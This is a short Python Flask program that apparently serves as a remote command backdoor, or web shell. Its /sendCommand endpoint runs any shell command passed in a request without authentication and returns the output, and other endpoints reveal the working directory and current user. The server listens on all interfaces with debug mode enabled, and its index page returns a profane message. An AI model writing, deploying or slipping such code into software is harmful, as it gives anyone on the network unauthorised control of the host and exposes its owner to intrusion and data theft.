import flask, subprocess, os, getpass

app = flask.Flask(__name__)

@app.route("/")
def index():
  return "<h1>fuck u</h1>"

@app.route("/sendCommand", methods=["POST"])
def sendCommand():
  process = subprocess.Popen(flask.request.args.get("command"), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

  output, error = process.communicate()

  return str(output.decode("utf8") + error.decode("utf8"))

@app.route("/cwd", methods=["GET"])
def cwd():
  return os.getcwd()

@app.route("/user", methods=["GET"])
def user():
  return getpass.getuser()

if __name__ == "__main__":
  app.run(host="0.0.0.0", port=80, debug=True)
